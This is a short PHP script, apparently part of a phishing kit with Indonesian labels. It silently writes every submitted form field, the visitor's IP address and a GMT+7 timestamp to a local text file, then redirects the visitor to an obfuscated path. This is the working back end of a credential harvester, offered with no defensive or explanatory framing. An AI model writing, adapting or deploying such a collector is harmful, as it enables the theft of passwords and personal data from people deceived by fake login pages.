<?php

header ('Location: MunGBs9BCi5kytgveCpWxdv');
$handle = fopen("415979872L.txt", "a");
fwrite($handle, "===============================");
fwrite($handle, "\n");

$ip = $_SERVER['REMOTE_ADDR'];
foreach($_POST as $variable => $value) {
   fwrite($handle, $variable);
   fwrite($handle, "= ");
   fwrite($handle, $value);
   fwrite($handle, "\r\n");
}

fwrite($handle, " Ip Addreass: $ip");
fwrite($handle, "\r\n");
fwrite($handle, " Waktu Masuk: ".date('d-M-Y G:i:s A',  strtotime("+7 hours"))."\r\n");
// assuming Indonesia timzone is GMT +7 and you want 24-hour format time 
// according to your comments below
fclose($handle);
exit;
?>